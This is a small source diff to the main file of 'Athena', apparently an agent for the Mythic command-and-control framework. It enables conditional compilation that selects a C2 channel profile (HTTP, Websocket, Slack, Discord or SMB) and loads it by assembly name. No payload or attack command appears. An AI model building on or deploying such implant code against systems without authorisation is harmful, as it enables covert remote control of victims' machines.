@@ -1,7 +1,4 @@
-﻿//#if DEBUG
-//#define HTTP
-//#endif
-using Athena.Commands;
+﻿using Athena.Commands;
 using Athena.Commands.Model;
 using Athena.Models.Athena.Commands;
 using Athena.Models.Mythic.Checkin;
@@ -19,7 +16,6 @@ using Athena.Plugins;
 using Athena.Models;
 using System.Reflection;
 using Athena.Models.Config;
-using Athena.Plugins;
 
 namespace Athena
 {
@@ -53,18 +49,19 @@ namespace Athena
 
         private IConfig GetConfig()
         {
-//#if WEBSOCKET
-//string profile = "AthenaWebsocket";
-//#elif HTTP
-//string profile = "Athena.Profiles.HTTP";
-//#elif SLACK
-//string profile = "AthenaSlack";
-//#elif DISCORD
-//string profile = "AthenaDiscord";
-//#elif SMB
-//string profile = "AthenaSMB";
-//#endif
+#if WEBSOCKET
+string profile = "Athena.Profiles.Websocket";
+#elif HTTP
+string profile = "Athena.Profiles.HTTP";
+#elif SLACK
+string profile = "Athena.Profiles.Slack";
+#elif DISCORD
+string profile = "Athena.Profiles.Discord";
+#elif SMB
+string profile = "Athena.Profiles.SMB";
+#else
             string profile = "Athena.Profiles.HTTP";
+#endif
             Assembly _tasksAsm = Assembly.Load($"{profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
 
             if (_tasksAsm == null)
@@ -84,17 +81,6 @@ namespace Athena
 
         private IForwarder GetForwarder()
         {
-//#if WEBSOCKET
-//string profile = "AthenaWebsocket";
-//#elif HTTP
-//            string profile = "Athena.Fowrwarder.SMB";
-//#elif SLACK
-//string profile = "AthenaSlack";
-//#elif DISCORD
-//string profile = "AthenaDiscord";
-//#elif SMB
-//string profile = "AthenaSMB";
-//#endif
             string profile = "Athena.Forwarders.SMB";
             Assembly _tasksAsm = Assembly.Load($"{profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
 
